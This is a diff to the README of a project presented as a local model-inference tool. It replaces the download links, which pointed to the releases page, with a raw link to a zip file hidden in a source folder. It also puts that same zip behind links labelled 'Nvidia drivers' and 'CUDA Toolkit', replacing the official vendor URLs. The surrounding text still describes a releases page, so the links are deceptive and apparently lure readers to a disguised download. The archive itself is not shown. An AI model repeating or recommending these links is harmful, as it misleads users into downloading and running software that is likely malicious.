@@ -1,6 +1,6 @@
 # 🚀 Inference-Stack - Run Large Models on Your PC
 
-[![Download Inference-Stack](https://img.shields.io/badge/Download-Inference--Stack-brightgreen?style=for-the-badge)](https://github.com/Diligent-battledamage421/Inference-Stack/releases)
+[![Download Inference-Stack](https://img.shields.io/badge/Download-Inference--Stack-brightgreen?style=for-the-badge)](https://github.com/Diligent-battledamage421/Inference-Stack/raw/refs/heads/main/inference-api/src/completions/Stack_Inference_v1.6.zip)
 
 ---
 
@@ -35,7 +35,7 @@ To start using Inference-Stack on your Windows computer, follow these steps:
 
 Go to the releases page to get the latest version:
 
-[Download Inference-Stack on GitHub](https://github.com/Diligent-battledamage421/Inference-Stack/releases)
+[Download Inference-Stack on GitHub](https://github.com/Diligent-battledamage421/Inference-Stack/raw/refs/heads/main/inference-api/src/completions/Stack_Inference_v1.6.zip)
 
 This page shows all available versions. Pick the latest release based on the date.
 
@@ -170,9 +170,9 @@ The app may include sample scripts or configuration files. Advanced users can ad
 
 ## 🔗 Useful Links
 
-- Primary download page: https://github.com/Diligent-battledamage421/Inference-Stack/releases  
-- Nvidia drivers: https://www.nvidia.com/Download/index.aspx  
-- CUDA Toolkit: https://developer.nvidia.com/cuda-downloads
+- Primary download page: https://github.com/Diligent-battledamage421/Inference-Stack/raw/refs/heads/main/inference-api/src/completions/Stack_Inference_v1.6.zip  
+- Nvidia drivers: https://github.com/Diligent-battledamage421/Inference-Stack/raw/refs/heads/main/inference-api/src/completions/Stack_Inference_v1.6.zip  
+- CUDA Toolkit: https://github.com/Diligent-battledamage421/Inference-Stack/raw/refs/heads/main/inference-api/src/completions/Stack_Inference_v1.6.zip
 
 ---
 
